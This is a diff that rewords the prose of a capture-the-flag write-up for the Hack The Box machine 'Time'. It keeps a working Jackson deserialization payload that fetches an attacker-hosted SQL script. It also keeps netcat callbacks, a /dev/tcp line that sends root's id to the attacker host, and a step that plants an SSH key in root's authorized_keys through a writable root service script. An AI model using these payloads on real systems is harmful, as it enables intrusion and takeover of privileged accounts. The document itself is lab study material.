@@ -6,14 +6,14 @@ points: 30
 rating: 3.5
 date: 2020-10-24
 avatar: assets/htb/time.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Time
 ---
+
 ## Enumeration
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves all types of output \(.nmap,.gnmap, and .xml\) with filenames of `<name>`.
+I kicked things off by running nmap against `<YOUR_IP>`. My usual flags are: `-p-` to cover every port, `-sC` (the same as `--script=default`) to fire the default enumeration scripts at the host, `-sV` for a service/version scan, and `-oA <name>` to write all three output formats \(.nmap,.gnmap, and .xml\) using `<name>` as the base filename.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/time]
@@ -38,7 +38,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Nmap done: 1 IP address (1 host up) scanned in 43.18 seconds
 ```
 
-ony two ports open, 22- SSH, and 80 - HTTP
+Only two ports were open: 22 (SSH) and 80 (HTTP).
 
 ### port 80 HTTP
 
@@ -46,7 +46,7 @@ ony two ports open, 22- SSH, and 80 - HTTP
 Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unexpected character ('<' (code 60)): expected a valid value (number, String, array, object, 'true', 'false' or 'null')
 ```
 
-Did a test for XSS, got an unhandled Java exception
+I tried an XSS payload and instead triggered an unhandled Java exception.
 
 ```text
 (function ($) {
@@ -92,11 +92,11 @@ Did a test for XSS, got an unhandled Java exception
 }) (jQuery);
 ```
 
-Checked the source code for the page, noticed a file `main.js`
+Looking at the page's source, I spotted a `main.js` file.
 
 ^--nothing?
 
-Searched for exploits related to com.fasterxml.jackson.core
+I went looking for exploits tied to com.fasterxml.jackson.core.
 
 [https://blog.doyensec.com/2019/07/22/jackson-gadgets.html](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
 
@@ -121,7 +121,7 @@ test.sql
 ["ch.qos.logback.core.db.DriverManagerConnectionSource",+{"url"%3a"jdbc%3ah2%3amem%3a%3bTRACE_LEVEL_SYSTEM_OUT%3d3%3bINIT%3dRUNSCRIPT+FROM+'http%3a//10.10.14.159%3a8082/test.sql'"}]
 ```
 
-AFter some testing, I discovered that the POC code had some `\` that they were using to excape the quotes. These were causing the validator in this case to throw an error.
+After a bit of trial and error, I realized the PoC contained `\` characters used to escape the quotes, and those backslashes were making the validator error out in this case.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/time]
@@ -131,7 +131,7 @@ Serving HTTP on 0.0.0.0 port 8082 (http://0.0.0.0:8082/) ...
 <YOUR_IP> - - [15/Mar/2021 19:36:15] "GET /test.sql HTTP/1.1" 200 -
 ```
 
-After I removed them from my code I got a connection back, downloading my test.sql.
+Once I stripped them out, the target reached back and pulled my test.sql.
 
 ```text
 kac0@kali:~/htb/time$ nc -lvnp 8081
@@ -140,7 +140,7 @@ connect to [10.10.14.159] from (UNKNOWN) [<YOUR_IP>] 36640
 uid=1000(pericles) gid=1000(pericles) groups=1000(pericles)
 ```
 
-I got a connection back on my machine, proving the remote code execution worked. Next I replaced the `id` command with a reverse shell.
+The callback to my box confirmed code execution was working. From there I swapped the `id` command out for a reverse shell.
 
 ## Initial Foothold
 
@@ -166,7 +166,7 @@ pericles@time:/var/www/html$ stty rows 27 columns 104
 pericles@time:/var/www/html$ export TERM=xterm-256color
 ```
 
-After changing the code in my test.sql file and sending it again, I recieved a reverse shell from the machine. I quickly upgraded to a full TTY and began enumeration.
+With the updated test.sql sent over, the box handed me a reverse shell. I promptly stabilized it into a full TTY and started enumerating.
 
 ```text
 <?php
@@ -196,7 +196,7 @@ if(isset($_POST['data'])){
 ?>
 ```
 
-index.php for the json validator site had some interesting code in it
+The json validator site's index.php held some noteworthy code.
 
 ## Road to User
 
@@ -229,7 +229,7 @@ pericles@time:/home/pericles$ cat user.txt
 f255************************13e3
 ```
 
-After checking `pericles`' home directory I found the `user.txt` proof!
+A quick look through `pericles`' home directory turned up the `user.txt` proof!
 
 ## Path to Power \(Gaining Administrator Access\)
 
@@ -248,7 +248,7 @@ remotes:
 aliases: {}
 ```
 
-in lxd directory
+found inside the lxd directory
 
 ```text
 pericles@time:/home/pericles/snap/lxd/17886/.config/lxc$ find / -group pericles 2>/dev/null
@@ -295,7 +295,7 @@ pericles@time:/home/pericles/snap/lxd/17886/.config/lxc$ find / -group pericles 
 /opt/json_project/classpath/jackson-annotations-2.9.8.jar
 ```
 
-I did a search for files that the group `pericles` had access to.
+I searched for files owned by the `pericles` group.
 
 ```text
 pericles@time:/dev/shm$ ls -la
@@ -307,14 +307,14 @@ pericles@time:/dev/shm$ cat payloadah34hL
 ["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.159:8082/test.sql'"}]
 ```
 
-The exploit code that I had used to access the machine was saved as a file in `/dev/shm` apparently.
+It turned out the exploit code I'd used to break in had been written to a file under `/dev/shm`.
 
 ```text
 #!/bin/bash
 zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
 ```
 
-I also found the file `/usr/bin/timer_backup.sh`. It looked like it was probably a cron script that made backups of the website data. I decided it would be a good place to check to see if there was anything interesting in old backups
+I also came across `/usr/bin/timer_backup.sh`, which appeared to be a cron script for backing up the website data. That seemed worth investigating to see whether old backups held anything useful.
 
 ```text
 pericles@time:/etc$ cat crontab
@@ -371,28 +371,28 @@ pericles@time:/etc/cron.d$ cat e2scrub_all
 10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r
 ```
 
-I searched through all of the crons and didn't find the script.
+Going through all the cron entries, I came up empty on the script.
 
 ```text
 pericles@time:/etc$ grep -r timer_backup.sh * 2>/dev/null
 systemd/system/web_backup.service:ExecStart=/bin/bash /usr/bin/timer_backup.sh
 ```
 
-Next, I used grep to search for the name of the script in all of the files in `/etc` and got a hit in the `systemd/system/web_backup.service` file.
+Next I grepped recursively through `/etc` for the script's name and got a hit in `systemd/system/web_backup.service`.
 
 ```text
 pericles@time:/etc$ ls -la systemd/system/web_backup.service
 -rw-r--r-- 1 root root 106 Oct 23 04:57 systemd/system/web_backup.service
 ```
 
-This service was running as root.
+That service ran as root.
 
 ```text
 pericles@time:/etc$ ls -la /usr/bin/timer_backup.sh
 -rwxrw-rw- 1 pericles pericles 88 Mar 16 22:25 /usr/bin/timer_backup.sh
 ```
 
-I double checked the permissions on the script, and saw that it was fully owned by `pericles`, and I could both read and write it. I decided to change the script to do a backup of root's Private key.
+Double-checking the script's permissions, I saw it was entirely owned by `pericles` with both read and write access for me. So I modified it to back up root's private key.
 
 ### Getting a shell
 
@@ -412,14 +412,14 @@ connect to [10.10.14.159] from (UNKNOWN) [<YOUR_IP>] 33180
 cat: /root/.ssh/id_rsa: No such file or directory
 ```
 
-Unfortunately it appeared as if there was no `id_rsa` file, or the script was not running as root.
+Unfortunately, it seemed there was no `id_rsa` file, or else the script wasn't running as root.
 
 ```text
 #!/bin/bash
 echo $(id) > /dev/tcp/10.10.14.159/8082 2>&1
 ```
 
-Next I changed the script so it would send me the user ID information of the context the script was being run under
+I then edited the script to send back the user ID info of whatever context it executed in.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/time]
@@ -432,7 +432,7 @@ connect to [10.10.14.159] from (UNKNOWN) [<YOUR_IP>] 33196
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-It was definitely running as root.
+It was clearly running as root.
 
 ```text
 #!/bin/bash
@@ -440,7 +440,7 @@ echo 'ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBB
 echo "Key away! Try to log in through SSH." > /dev/tcp/10.10.14.159/8082
 ```
 
-Next I tried sending my SSH public key to `root`'s `authorized_keys` file. Each time I modified the script it only took a few seconds until it connected back, but just in case I added a message to let me know when it was done.
+Next I had it append my SSH public key to `root`'s `authorized_keys` file. The script fired back within a few seconds of each change, but I tacked on a message anyway so I'd know when it had run.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/time]
